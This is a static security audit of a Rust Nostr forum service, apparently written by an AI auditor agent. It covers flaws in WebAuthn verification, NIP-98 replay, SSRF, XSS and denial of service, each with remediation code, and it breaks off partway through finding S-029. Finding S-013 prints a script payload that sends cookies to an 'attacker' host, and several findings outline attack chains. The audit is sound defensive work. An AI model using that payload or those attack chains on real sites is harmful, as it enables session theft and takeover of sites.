# community-forum-rs — Baseline Security Audit

**Audit date:** 2026-04-20
**Auditor:** `qe-security-auditor` (V3 forum-upgrade-sprint swarm)
**Scope:** static source review of `community-forum-rs` at tip of `main`, pre Obelisk-Polish sprint.
**Method:** manual code review (SAST). No DAST, no fuzzing, no runtime testing.
**Crates reviewed:** `auth-worker`, `nostr-core`, `relay-worker`, `pod-worker`, `preview-worker`, `forum-client/src/auth`.
**Standards applied:** OWASP Top 10 2021, OWASP ASVS L2, NIP-98/01/42/44/50/29/56/16 threat model, BIP-340.

---

## 1. Executive Summary

**Overall risk rating: HIGH.**

The codebase is architecturally clean and shows good instincts (zeroize, parameterised SQL, origin/RP validation, constant-time comparisons, BIP-340 Schnorr, NIP-44 v2) but contains **two critical WebAuthn flaws that collapse the entire passkey authentication story to a base64 plaintext handshake**: login never verifies the assertion signature, and registration never verifies attestation — the server trusts client-supplied pubkey/credential/public_key fields verbatim. Combined with a nuclear `/api/admin/reset-db` endpoint protected by a single NIP-98 token with a 60-second tolerance and no nonce cache, and a first-user-is-admin bootstrap, an attacker who captures a single admin NIP-98 header (or finds an un-provisioned instance) can take over the forum within one minute.

Beyond authentication, the biggest systemic weaknesses are: NIP-42 relay AUTH challenges drawn from `Math.random()`, NIP-98 event kind (27235) is classified as an Ephemeral relay event so the **admin auth tokens are broadcast to every subscriber**, session private keys stored as hex in `sessionStorage`, SSRF defences lack DNS rebinding and redirect handling, and no durable replay protection on NIP-98.

No committed secrets found. `.env` / `.env.*` are correctly gitignored. No `eval`/HTML-templating vulnerabilities in the client beyond the WebID sidecar which interpolates `display_name` unsanitised into an HTML page.

### Severity histogram

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High     | 8 |
| Medium   | 12 |
| Low      | 5 |
| Info     | 3 |
| **Total**| **31** |

### Top 10 fix-first

| # | ID    | Title                                                             | Severity | Effort  |
|---|-------|-------------------------------------------------------------------|----------|---------|
| 1 | S-001 | WebAuthn assertion signature never verified on login              | Critical | medium  |
| 2 | S-002 | WebAuthn registration accepts client-supplied credential blindly  | Critical | medium  |
| 3 | S-003 | `/api/admin/reset-db` nuclear wipe with replayable NIP-98 token   | Critical | small   |
| 4 | S-004 | First-user-is-admin bootstrap race                                | High     | small   |
| 5 | S-005 | NIP-42 AUTH challenges drawn from `Math.random()`                 | High     | trivial |
| 6 | S-006 | Kind 27235 (NIP-98) classified Ephemeral → admin tokens broadcast | High     | trivial |
| 7 | S-007 | NIP-98 has no nonce/replay cache                                  | High     | small   |
| 8 | S-008 | Nostr privkey hex stored in `sessionStorage`                      | High     | medium  |
| 9 | S-009 | SSRF filter has no DNS rebinding protection                       | High     | medium  |
| 10| S-010 | `/api/whitelist/list` exposes full member + cohort list publicly  | High     | trivial |

### Out-of-scope

- Runtime testing (DAST), fuzzing, coverage analysis, penetration testing.
- Cloudflare platform configuration (`wrangler.toml` secrets binding, R2/KV ACLs).
- Browser extension interactions beyond `window.nostr` shape checks.
- Third-party dependency source auditing (only advisory-check was performed).
- Physical/hardware side-channel attacks on passkey authenticators.
- Denial of wallet / Cloudflare billing abuse via paid tiers.
- `admin-cli` crate (internal tooling, out of attack surface).
- Infrastructure (DNS, TLS, WAF) — assumed Cloudflare-managed.

---

## 2. Findings

### S-001 WebAuthn assertion signature never verified on login
- **Category:** auth / crypto
- **Severity:** critical
- **CVSS 3.1:** 9.8 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Location:** `crates/auth-worker/src/webauthn.rs:471-632` (`login_verify`)
- **Observed:** The handler validates NIP-98, looks up the stored credential, checks `clientDataJSON.origin`, `clientDataJSON.challenge` freshness, `authenticatorData` RP-ID hash, UP/UV flags, and the sign counter. It then returns `{verified: true, pubkey}` and sets the session. `inner_response.signature` is never base64-decoded. `cred.public_key` (the stored COSE/attestation blob) is never used in any verification step. The only thing tying the response to the credential is the counter, which is advisory and may be zero.
- **Attack scenario:** An attacker who knows a target pubkey + credential_id (both quasi-public — credential_id is returned by `/auth/login/options`) crafts a `login/verify` body with hand-assembled `clientDataJSON` and `authenticatorData` that pass all structural checks but a garbage `signature`. They also need a valid NIP-98 token signed by the target pubkey — which they can mint themselves because `register_verify` (S-002) let them pick the pubkey in the first place. End state: full impersonation of any registered account.
- **Recommendation:** Add BIP-340-style or WebAuthn ES256/EdDSA verification:
  ```rust
  // verificationData = authenticatorData || SHA256(clientDataJSON)
  let mut signed = auth_data.clone();
  signed.extend_from_slice(&Sha256::digest(&client_data_bytes));
  let signature_bytes = base64url_decode(&inner_response.signature.unwrap_or_default())?;
  let cose_public_key = parse_cose_key(&base64url_decode(&cred.public_key)?)?;
  cose_public_key.verify(&signed, &signature_bytes)
      .map_err(|_| json_err("Signature verification failed", 401))?;
  ```
  Use `passkey-types` (already in workspace deps) or `webauthn-rs-proto` to avoid rolling COSE parsing.
- **Effort:** medium

---

### S-002 WebAuthn registration accepts client-supplied credential without attestation
- **Category:** auth / crypto
- **Severity:** critical
- **CVSS 3.1:** 9.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
- **Location:** `crates/auth-worker/src/webauthn.rs:283-378` (`register_verify`)
- **Observed:** `body.pubkey` is taken on faith (`is_valid_pubkey` is a 64-hex-char regex, nothing more). The handler fetches *the most recent unexpired challenge* (`ORDER BY created_at DESC LIMIT 1`) without binding the challenge to the registering session. `credential_id` and `public_key` are read from the body (line 321–332). `attestationObject` is never parsed — `public_key` falls back to `credential_id` if attestation is missing (line 339 `.unwrap_or_else(|| credential_id.clone())`). PRF-salt is also client-chosen.
- **Attack scenario:**
  1. Attacker calls `/auth/register/options` to push a fresh challenge into the `challenges` table.
  2. Attacker POSTs `/auth/register/verify` with `{pubkey: <victim-controlled-or-forged>, response: {id, response: {attestationObject: <anything>}}}`.
  3. Server provisions a pod for the attacker-chosen pubkey. In combination with S-001, login for that pubkey now succeeds with any input because no signature verification happens.
  4. Concurrent registration race: because `challenge_row` is the *newest* row and is only deleted after success, two overlapping `/auth/register/verify` calls can both consume the same challenge.
- **Recommendation:**
  - Bind the challenge to the session (`sid` cookie or PKCE-style code_verifier) so `register_verify` selects a challenge tied to *this* registrant.
  - Parse `attestationObject` with `passkey-types::webauthn::attestation` and verify `fmt`/`attStmt` (or require `none` format with additional proof-of-possession).
  - Derive the expected pubkey via PRF *server-side* from the stored `prf_salt` + an independently-verified authenticator-bound secret, rather than accepting it from the client.
  - `UPDATE challenges SET consumed_at = now WHERE challenge = ? AND consumed_at IS NULL` to make consumption atomic.
- **Effort:** medium

---

### S-003 `/api/admin/reset-db` nuclear wipe with replayable NIP-98 token
- **Category:** auth / authorization
- **Severity:** critical
- **CVSS 3.1:** 8.1 AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:H
- **Location:** `crates/relay-worker/src/whitelist.rs:434-462` (`handle_reset_db`)
- **Observed:** Handler wipes both `events` and `whitelist` D1 tables. Auth is a single `require_nip98_admin()` call which uses `nostr_core::verify_nip98_token_at` with a **60-second tolerance and no nonce cache** (see S-007). No confirmation token, no two-step, no soft-delete, no backup trigger, no rate-limit. Error paths are ignored (`let _ = ...`) so partial wipes are silent.
- **Attack scenario:** Attacker captures any admin NIP-98 `Authorization` header observed in logs, relay broadcasts (see S-006), browser DevTools, or a MITM of a forgotten non-TLS link. Within 60 seconds they replay the header to `/api/admin/reset-db`. All events and whitelist rows are deleted. Next registrant becomes admin (first-user-is-admin, S-004). Total takeover.
- **Recommendation:**
  - Require a per-request nonce (`d` or `expiration` tag) and persist it to a short-lived KV to block replays.
  - Require a second confirmation factor: separate `/api/admin/reset-db/confirm` with a fresh NIP-98 bound to the first request's hash, with a human-readable confirmation string signed into the event content.
  - Move destructive endpoints behind a `DANGEROUS_ENDPOINTS_ENABLED` env flag (default off) and behind admin-IP-allowlist middleware.
  - Log all successful calls to a tamper-evident audit trail with the admin's pubkey.
- **Effort:** small

---

### S-004 First-user-is-admin bootstrap race
- **Category:** authorization
- **Severity:** high
- **CVSS 3.1:** 8.1 AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
- **Location:** `crates/relay-worker/src/relay_do/storage.rs:254-275` (`auto_whitelist`)
- **Observed:** On every kind-0 profile publish the code checks `SELECT COUNT(*) FROM whitelist WHERE is_admin = 1`. If zero, the submitting pubkey is inserted with `is_admin = 1` and cohorts `["home","dreamlab","minimoonoir"]`. There is no deployment-time seed, no deploy-key ceremony, and (when combined with S-003) the admin table can be reset to zero.
- **Attack scenario:**
  1. Fresh deploy or post-reset (S-003) → `admin_count = 0`.
  2. Attacker publishes a kind-0 event → becomes admin silently.
  3. Legitimate admin can no longer bootstrap because the check is `WHERE is_admin = 1` — first writer wins.
- **Recommendation:**
  - Require a deploy-time `ADMIN_PUBKEY` env binding. `auto_whitelist` seeds only that pubkey.
  - Or: gate the bootstrap behind a one-shot `ADMIN_BOOTSTRAP_TOKEN` KV key that is rotated on first use and never regenerated automatically.
  - Add a test that fails if `auto_whitelist` promotes any caller whose pubkey != `env.ADMIN_PUBKEY`.
- **Effort:** small

---

### S-005 NIP-42 AUTH challenges drawn from `Math.random()`
- **Category:** auth / crypto
- **Severity:** high
- **CVSS 3.1:** 7.5 AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Location:** `crates/relay-worker/src/relay_do/session.rs:267-274` (`generate_challenge`)
- **Observed:** The relay AUTH challenge is built from `js_sys::Math::random()` concatenated in a loop. `Math.random()` is **not cryptographically secure** — V8's xorshift128+ state is predictable after ~5 outputs.
- **Attack scenario:** Attacker opens several WebSocket connections, captures the AUTH challenges, recovers the `Math.random` state, and predicts future challenges — enabling offline pre-signing (combined with a leaked signer) or targeted cross-account hijack when combined with a Nostr signer that doesn't bind the relay URL.
- **Recommendation:**
  ```rust
  use getrandom::getrandom;
  let mut buf = [0u8; 16];
  getrandom(&mut buf).expect("secure rng");
  hex::encode(buf)
  ```
  In Cloudflare Workers, `crypto.getRandomValues` is exposed via `getrandom` when compiled with the `js` feature (already enabled in workspace).
- **Effort:** trivial

---

### S-006 Kind 27235 (NIP-98) classified as Ephemeral → admin tokens broadcast to subscribers
- **Category:** logging / confidentiality
- **Severity:** high
- **CVSS 3.1:** 7.4 AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N
- **Location:** `crates/relay-worker/src/relay_do/broadcast.rs:22-32` + test at line 238
- **Observed:** NIP-16 `event_treatment()` returns `Ephemeral` for kind 27235. Ephemeral events are not stored but **are broadcast to every matching subscription**. NIP-98 tokens contain a Schnorr signature over the request body — they are bearer credentials and must never be published to the relay.
- **Attack scenario:** A malicious client subscribes to `{kinds: [27235]}` on the same relay the admin uses. Any NIP-98 `Authorization` header the admin sends to a sibling worker, if ever routed through the relay ingest path (or pasted for debug), surfaces in real time. The token can be replayed within 60 seconds (S-007) against `/api/admin/reset-db` (S-003).
- **Recommendation:** Add an explicit reject in `nip_handlers.rs::handle_event()`:
  ```rust
  if event.kind == 27235 {
      return Err(ValidationError::InvalidKind("NIP-98 tokens are not publishable"));
  }
  ```
  Match the NIP-98 spec: tokens are HTTP-only and must not transit the relay event bus at all.
- **Effort:** trivial

---

### S-007 NIP-98 has no nonce/replay cache
- **Category:** auth / crypto
- **Severity:** high
- **CVSS 3.1:** 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L
- **Location:** `crates/nostr-core/src/nip98.rs:19,233` + `crates/relay-worker/src/auth.rs:20-28`
- **Observed:** `TIMESTAMP_TOLERANCE = 60` seconds; `now.abs_diff(event.created_at) > TIMESTAMP_TOLERANCE` is the only replay check. Tokens are not bound to a nonce; no KV record of consumed token IDs.
- **Attack scenario:** Any captured admin token (browser DevTools, proxy log, mistakenly-pushed screenshot, the NIP-16 broadcast in S-006) is replayable for 60 seconds against any admin endpoint. Combined with S-003 that's an instance-killer.
- **Recommendation:**
  - In `verify_nip98_token_at`, after signature verification, compute `token_id = event.id` and write it to a Workers KV `nip98_nonces` with `expiration: now + TIMESTAMP_TOLERANCE + 5`. Reject if key already exists.
  - Optionally require NIP-98 events to include a `d` tag bound to the request and stored.
- **Effort:** small

---

### S-008 Nostr private key stored as hex in `sessionStorage`
- **Category:** secrets / client
- **Severity:** high
- **CVSS 3.1:** 7.4 AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
- **Location:** `forum-client/src/auth/session.rs:84-97` (`save_privkey_session`)
- **Observed:** PRF-derived private key is persisted as 64-char hex in `sessionStorage`. A `pagehide` handler zeroises on non-bfcache unload, but `sessionStorage` is readable by every script on the same origin during the tab's lifetime — including injected extension scripts, XSS payloads, or third-party OG-preview iframes if CSP slips.
- **Attack scenario:** Any reflected/stored XSS → one line of JS exfiltrates the hex privkey → attacker has lifetime control over the Nostr identity, can forge any event.
- **Recommendation:**
  - Never persist the raw privkey. Keep it in a closure-captured `zeroize::Zeroizing<[u8; 32]>` with the reference held only by the signer actor.
  - For cross-tab sharing, use a `BroadcastChannel` with per-tab-ephemeral symmetric keys rather than `sessionStorage`.
  - Alternatively, re-derive from PRF on every signature — passkey UX lets this be silent with user-verification=preferred.
  - Add `Content-Security-Policy: default-src 'self'; script-src 'self' 'wasm-unsafe-eval'` to eliminate the XSS surface.
- **Effort:** medium

---

### S-009 SSRF filter has no DNS rebinding protection
- **Category:** SSRF
- **Severity:** high
- **CVSS 3.1:** 7.5 AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N
- **Location:** `crates/preview-worker/src/fetch.rs` (SSRF guard), `crates/pod-worker/src/remote_storage.rs:*` (WebFinger/Solid discovery)
- **Observed:** The URL filter correctly blocks private/link-local/ULA/IPv4-mapped-v6/metadata-endpoint literals, integer/hex hostnames, and non-http(s) schemes. It resolves the hostname **once** for the filter decision; the subsequent `fetch` resolves DNS **again** and follows redirects without re-validating each hop's IP.
- **Attack scenario:** Attacker owns `rebind.example.com` with 1-second TTL. First answer: `93.184.216.34` (pass). Second answer (on the actual fetch): `169.254.169.254` or `10.0.0.1` — the Cloudflare Worker fetches internal metadata / internal cluster services. Similarly, a redirect from `public.example.com` to `http://10.0.0.1/admin` is followed because redirect targets aren't re-filtered.
- **Recommendation:**
  - Resolve the hostname *once* upfront, then fetch by IP with a `Host:` header set to the original hostname.
  - Set `redirect: "manual"` on the fetch init and re-run the SSRF filter on each `Location` before continuing.
  - Maintain a timeout + response-body size cap (see S-018).
- **Effort:** medium

---

### S-010 `/api/whitelist/list` exposes full member + cohort list without auth
- **Category:** authorization / info disclosure
- **Severity:** high
- **CVSS 3.1:** 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Location:** `crates/relay-worker/src/whitelist.rs` — `handle_whitelist_list` (check route table in `lib.rs`)
- **Observed:** The handler returns `{pubkey, is_admin, cohorts, created_at}` rows for *every* whitelist entry. Route is registered without a NIP-98 admin guard (compare `handle_reset_db` which does call `require_nip98_admin`).
- **Attack scenario:** Anonymous attacker dumps the full membership list → identifies admin pubkeys for targeted phishing/passkey-stealing, learns cohort topology, and can enumerate users out-of-band for follow-up attacks (S-003/S-007 replay).
- **Recommendation:** Wrap the handler in `require_nip98_admin` (or at minimum `require_nip98_member`). If a public directory is required, expose only non-sensitive fields and redact `is_admin` and `created_at`.
- **Effort:** trivial

---

### S-011 Deterministic Schnorr signing (`aux_rand = [0u8;32]`) used in core `sign`
- **Category:** crypto
- **Severity:** medium
- **CVSS 3.1:** 5.3 AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
- **Location:** `crates/nostr-core/src/keys.rs:63` (`SecretKey::sign`)
- **Observed:** BIP-340 permits deterministic signing (zero aux) but notes that auxiliary randomness provides side-channel hardening against fault attacks. `sign()` is deterministic; a separate `sign_event` path uses random aux, but `sign()` is exposed and used by other call sites.
- **Attack scenario:** In a constrained WASM env with a co-resident adversary capable of fault injection, deterministic Schnorr enables differential attacks that recover the private key from a single successful fault.
- **Recommendation:** Default to `getrandom()` for aux. Expose `sign_deterministic_unchecked` only for test vectors. Check all internal callers — in particular `nip44.rs` conversation keys should not reuse `sign`.
- **Effort:** trivial

---

### S-012 NIP-98 URL-binding strips query string
- **Category:** auth
- **Severity:** medium
- **CVSS 3.1:** 5.4 AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N
- **Location:** `crates/relay-worker/src/whitelist.rs:436` + similar in pod-worker
- **Observed:** `request_url = format!("{}{}", url.origin().ascii_serialization(), url.path());` — query string and fragment are excluded. The NIP-98 `u` tag therefore signs only origin+path, not the full URL.
- **Attack scenario:** A valid admin token for `POST /api/admin/reset-db` can be replayed at `POST /api/admin/reset-db?force=true&cascade=events,profiles,...` if any future admin handler adds query-string side effects. Today this is latent; introducing a parameterised admin handler would make it exploitable.
- **Recommendation:** Include the query string in the bound URL: `format!("{}{}?{}", origin, path, query)` (empty query is fine). Document the invariant in `nostr_core::nip98`.
- **Effort:** trivial

---

### S-013 WebID sidecar renders `display_name` into HTML without escaping
- **Category:** XSS / injection
- **Severity:** medium
- **CVSS 3.1:** 6.1 AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
- **Location:** `crates/pod-worker/src/webid.rs:*` (HTML template)
- **Observed:** `display_name` (from the profile, user-controlled) is interpolated into the `<title>` and `<h1>` of the WebID HTML page via `format!()`, with no HTML-escape. The sidecar is served as `text/html`.
- **Attack scenario:** User sets their display name to `</h1><script>fetch('https://attacker/'+document.cookie)</script>`. Anyone loading the WebID page (e.g. via Solid discovery) triggers script execution on the pod origin — stealing any same-origin capabilities.
- **Recommendation:** Use `v_htmlescape` or a small ad-hoc escaper for `&`, `<`, `>`, `"`, `'`. Set `Content-Security-Policy: default-src 'none'; style-src 'self'` on the WebID response.
- **Effort:** trivial

---

### S-014 NIP-50 `search` filter has no length cap or cost budget
- **Category:** DoS
- **Severity:** medium
- **CVSS 3.1:** 5.3 AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L
- **Location:** `crates/relay-worker/src/relay_do/filter.rs:*` (NIP-50 branch)
- **Observed:** The filter builder escapes `%` and `_` in tag values (good) but applies no length cap to the `search` string, no concurrency cap per connection, and no SQLite PRAGMA for query cost budgeting. D1 uses SQLite; a query with 20 `LIKE '%<1KB>%'` terms on a million-row `events` table will exhaust CPU.
- **Attack scenario:** Authenticated user subscribes with `{search: "<1KB adversarial string>"}` repeated across 20 subscriptions (`MAX_SUBSCRIPTIONS=20`). D1 spends seconds per query; the DO is pinned; other users experience latency or disconnects.
- **Recommendation:**
  - Cap `search` length at 128 chars and reject longer.
  - Require `search` filters to include at least one of `{kinds, authors, #e, #p}` — refuse bare `{search: ...}`.
  - Add a D1 query timeout and monitor.
- **Effort:** small

---

### S-015 NIP-01 event timestamp tolerance is 7 days
- **Category:** auth / anti-abuse
- **Severity:** medium
- **CVSS 3.1:** 4.3 AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N
- **Location:** `crates/relay-worker/src/relay_do/nip_handlers.rs` — `MAX_TIMESTAMP_DRIFT` constant
- **Observed:** `MAX_TIMESTAMP_DRIFT` is 7 days. Events can be dated up to 7 days in the past or future and still be accepted.
- **Attack scenario:** Attacker pre-signs moderation (kind 1984 report), deletion (kind 5), or reaction events for future/past dates to manipulate ordering, deletion targets, or feed positioning. Reordering attacks on replaceable events (kind 0, 3, parametrised) become easier.
- **Recommendation:** Tighten to 2 minutes (future) / 5 minutes (past). For replaceable events, also enforce monotonic `created_at` per `(pubkey, kind, d-tag)`.
- **Effort:** trivial

---

### S-016 Preview-worker rate-limit fails open on KV error
- **Category:** DoS / anti-abuse
- **Severity:** medium
- **CVSS 3.1:** 5.3 AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
- **Location:** `crates/preview-worker/src/rate_limit.rs` (equivalent to auth-worker `rate_limit.rs`)
- **Observed:** KV read/write errors short-circuit to `Ok(())` (fail-open). Also applies to `auth-worker/src/rate_limit.rs`.
- **Attack scenario:** Attacker triggers KV pressure (parallel writes to adjacent keys) or exploits a KV outage → rate-limiter is effectively off → unbounded requests → billing abuse or pod-provisioning flood.
- **Recommendation:** Fail closed: on KV error return 503 with `Retry-After: 10`. Add a local in-memory token bucket per DO/isolate as secondary defence.
- **Effort:** small

---

### S-017 `client_ip()` fallback to `"unknown"` creates shared rate-limit bucket
- **Category:** DoS / anti-abuse
- **Severity:** medium
- **CVSS 3.1:** 5.3 AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
- **Location:** `crates/relay-worker/src/relay_do/mod.rs` + preview-worker request helper
- **Observed:** When `CF-Connecting-IP` is missing, `client_ip()` returns `"unknown"`. Rate limits keyed on this single bucket mean any request lacking the header shares a 10/sec budget with every other such request.
- **Attack scenario:** Attacker strips `CF-Connecting-IP` by fronting with a mis-configured proxy or, more realistically, by using local `curl` tests that pollute the shared bucket, denying service to legitimately header-less internal callers.
- **Recommendation:** Reject requests without `CF-Connecting-IP` at the edge (should be injected by Cloudflare automatically on the public zone). For local dev, key on a dev-mode fallback that is not the literal string `unknown`.
- **Effort:** trivial

---

### S-018 Preview-worker has no response-body size cap
- **Category:** DoS / SSRF
- **Severity:** medium
- **CVSS 3.1:** 5.3 AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L
- **Location:** `crates/preview-worker/src/fetch.rs`
- **Observed:** `fetch_with_timeout` reads the entire response body into memory before OG parsing. No `Content-Length` check, no streaming limit.
- **Attack scenario:** Attacker points the preview URL at a 1-GB file (or a chunked stream that never terminates). Worker memory balloons, isolate killed, cost incurred, concurrent previews degrade.
- **Recommendation:** After fetch, read `Content-Length`; reject if > 256 KB. Use `ReadableStream.getReader()` and cap total bytes streamed at 256 KB, aborting with a controller if exceeded.
- **Effort:** small

---

### S-019 Preview-worker fetches `text/html` without content-type check
- **Category:** SSRF / content confusion
- **Severity:** medium
- **CVSS 3.1:** 4.3 AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
- **Location:** `crates/preview-worker/src/fetch.rs`, `crates/preview-worker/src/og_parse.rs`
- **Observed:** OG parser runs on any body. No `Content-Type` verification gate.
- **Attack scenario:** URL returns `image/jpeg` or `application/octet-stream` but body is crafted HTML-with-embedded-null to bias OG extraction. Or a `/etc/passwd`-style file served as `text/plain` is regex-matched.
- **Recommendation:** Require `Content-Type: text/html` (or `application/xhtml+xml`). Reject otherwise with 415.
- **Effort:** trivial

---

### S-020 Pod PUT reads body before quota check (TOCTOU)
- **Category:** DoS / quota bypass
- **Severity:** medium
- **CVSS 3.1:** 4.3 AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L
- **Location:** `crates/pod-worker/src/*.rs` (PUT handler + `quota.rs:*`)
- **Observed:** `get_quota` → compute delta → `update_usage`. Between `get_quota` and `update_usage` two concurrent PUTs both see the pre-write usage and both succeed. `quota.rs` also reads the full body before sizing; large bodies transit worker memory before quota rejection.
- **Attack scenario:** User near the 50 MB cap fires 5 parallel 49 MB PUTs. Each sees usage = 1 MB and passes the check. Final usage = 245 MB, 5× over-quota.
- **Recommendation:**
  - Use `Content-Length` header for pre-check before reading body; reject early at 413.
  - Wrap `get_quota` + `update_usage` in a D1 transaction with `UPDATE ... WHERE usage + ? <= quota`; if zero rows affected, reject.
  - For WebSocket hibernation scenarios use a per-pubkey Durable Object to serialise writes.
- **Effort:** medium

---

### S-021 Pod `resource_path` lacks `..` / `.` normalisation
- **Category:** path traversal
- **Severity:** medium
- **CVSS 3.1:** 4.9 AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N
- **Location:** `crates/pod-worker/src/lib.rs` request routing + `provision.rs`
- **Observed:** `pods/{pubkey}/{profile|public|private|inbox|settings}/{...tail}` — `tail` is passed to R2 without collapsing `..`/`.` segments. R2 treats `/` as a path separator; `..` as a literal component means "`..`" is a legal object-name component and sits harmlessly under the pubkey prefix, but only because the current layout accepts no wildcards. Any future re-mapping (e.g. WebFinger proxying) that trusts the path is vulnerable.
- **Attack scenario:** Latent. If a helper ever normalises R2 keys into OS paths (e.g. for backup export), `..` segments will escape the pubkey jail.
- **Recommendation:** Reject any `resource_path` containing `..`, `.`, `//`, or a leading `/` up front. Centralise in one `validate_resource_path` helper.
- **Effort:** trivial

---

### S-022 D1 schema re-run on every relay request
- **Category:** DoS / concurrency
- **Severity:** medium
- **CVSS 3.1:** 3.7 AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L
- **Location:** `crates/relay-worker/src/schema.rs` + DO startup path
- **Observed:** `schema::ensure` is invoked per-request / per-DO-spawn. All `CREATE TABLE IF NOT EXISTS` statements execute every time, including `CREATE INDEX IF NOT EXISTS` which D1 treats as metadata touches.
- **Attack scenario:** Mass-request floods increase D1 metadata pressure and add latency. Minor, but a measurable tail-latency contributor.
- **Recommendation:** Guard with an in-memory `ONCE: OnceCell<()>` per isolate. On DO hibernation wake-up the first request runs it; subsequent requests skip.
- **Effort:** trivial

---

### S-023 Admin identity is duplicated across pod-KV and relay-D1 (drift risk)
- **Category:** authorization / integrity
- **Severity:** medium
- **CVSS 3.1:** 5.3 AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:H/A:N
- **Location:** `crates/pod-worker/src/admin.rs` (KV `ADMIN_PUBKEYS`) + `crates/relay-worker/src/whitelist.rs` (D1 `whitelist.is_admin`)
- **Observed:** Pod and relay maintain separate admin stores. The relay's `handle_whitelist_update` has no cross-writer to pod-KV. An admin revoked in the relay can still act as admin against pod endpoints until manually revoked.
- **Attack scenario:** Former admin retains pod-level admin after relay revocation — continues modifying WebIDs, ACLs, or quotas of other users.
- **Recommendation:**
  - Make the relay the single source of truth. Pod-worker asks the relay `/api/whitelist/check` (authenticated, cached 30 s) for admin status.
  - Or emit a Durable Object broadcast on admin change and have pod-worker subscribe and refresh its KV.
- **Effort:** medium

---

### S-024 `error_response()` escapes only `"` in JSON error bodies
- **Category:** injection / logging
- **Severity:** low
- **CVSS 3.1:** 3.1 AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N
- **Location:** `crates/relay-worker/src/relay_do/*.rs` (`error_response` helper)
- **Observed:** Manual JSON escape for error messages replaces only `"` → `\"`. Does not handle `\`, CR, LF, or other control chars.
- **Attack scenario:** A user-supplied string containing a literal `\` in an error path breaks JSON parsing downstream (e.g. monitoring/log ingesters). Control characters in error messages (embedded from upstream fetch failures) can break log-line framing.
- **Recommendation:** Use `serde_json::json!({"error": message})` and let serde handle escaping. Remove manual escapers.
- **Effort:** trivial

---

### S-025 `nostr` crate pinned to alpha 0.44 with minor-only pin
- **Category:** supply chain
- **Severity:** low
- **CVSS 3.1:** 3.7 AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L
- **Location:** `community-forum-rs/Cargo.toml:14-22`
- **Observed:** `nostr = "0.44"`, `nostr-sdk = "0.44"`. The `0.44.x` line is explicitly marked alpha by the maintainer. With Cargo's default semver rules, `0.44.1` → `0.44.99` is within the compatibility range — pre-1.0 minor bumps are frequently breaking.
- **Attack scenario:** A supply-chain compromise at the `rust-nostr` registry publishes a malicious `0.44.99` which `cargo update` pulls in. At `0.44` minor-pin the attacker has a wide target.
- **Recommendation:** Pin to exact: `nostr = "=0.44.3"` (or whichever patch is current), and commit a `Cargo.lock`. Track upstream via Dependabot and promote manually. Plan the migration to stable `1.x` once upstream cuts it.
- **Effort:** trivial

---

### S-026 `passkey-types` workspace dep unused by the actual WebAuthn handler
- **Category:** supply chain / architecture
- **Severity:** low
- **CVSS 3.1:** 3.1 AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
- **Location:** `Cargo.toml:27` vs `crates/auth-worker/Cargo.toml:10-23`
- **Observed:** Workspace declares `passkey-types = "0.3"`. `auth-worker/Cargo.toml` does NOT depend on it. The worker rolls its own WebAuthn handling (see S-001/S-002). Dead dependency == attack surface without benefit.
- **Attack scenario:** Present but unused crate contributes to supply-chain surface and creates a misleading signal to reviewers ("we use `passkey-types`, so our WebAuthn is correct"). It isn't used where it matters.
- **Recommendation:** Either remove from workspace if truly unused, OR (preferred) actually depend on it from `auth-worker` and delegate attestation + signature verification to it (fixes S-001 + S-002).
- **Effort:** small

---

### S-027 Regex-based OG meta-tag parser
- **Category:** parsing / injection
- **Severity:** low
- **CVSS 3.1:** 3.7 AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N
- **Location:** `crates/preview-worker/src/og_parse.rs`
- **Observed:** OG tags are extracted with regular expressions over raw HTML. Known fragility for malformed HTML, script-embedded `<meta>` tags, and comment-escaped strings.
- **Attack scenario:** Attacker crafts a page where OG tags render differently in a real parser vs the regex — malicious preview title/description displayed to forum users (feeds social engineering).
- **Recommendation:** Switch to `html5ever` or `scraper` (maintained parser). Costs 200 KB of WASM — acceptable for the preview-only worker.
- **Effort:** medium

---

### S-028 WebAuthn `public_key` column may equal `credential_id` (nil-attestation branch)
- **Category:** auth / crypto
- **Severity:** low
- **CVSS 3.1:** 3.7 AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
- **Location:** `crates/auth-worker/src/webauthn.rs:339` — `attestation.unwrap_or_else(|| credential_id.clone())`
- **Observed:** When attestation is missing, `public_key` is stored as `credential_id` as a placeholder. This masks the fact that no real attestation was ever captured. Once S-001 is fixed, any row where `public_key == credential_id` will fail signature verification — but the schema does not flag this state.
- **Attack scenario:** Forensic opacity: after S-001 is fixed, login suddenly fails for legacy users with no clear reason; error path indistinguishable from signature forgery.
- **Recommendation:** Add a `NOT NULL` constraint on the attestation field and reject registrations where it's absent. For legacy rows, trigger a forced re-enrolment flow.
- **Effort:** small

---

### S-029 CORS echoes `Origin` for any entry in `ALLOWED_ORIGINS`
- **Category:** CORS / CSRF
- **Severity:** low
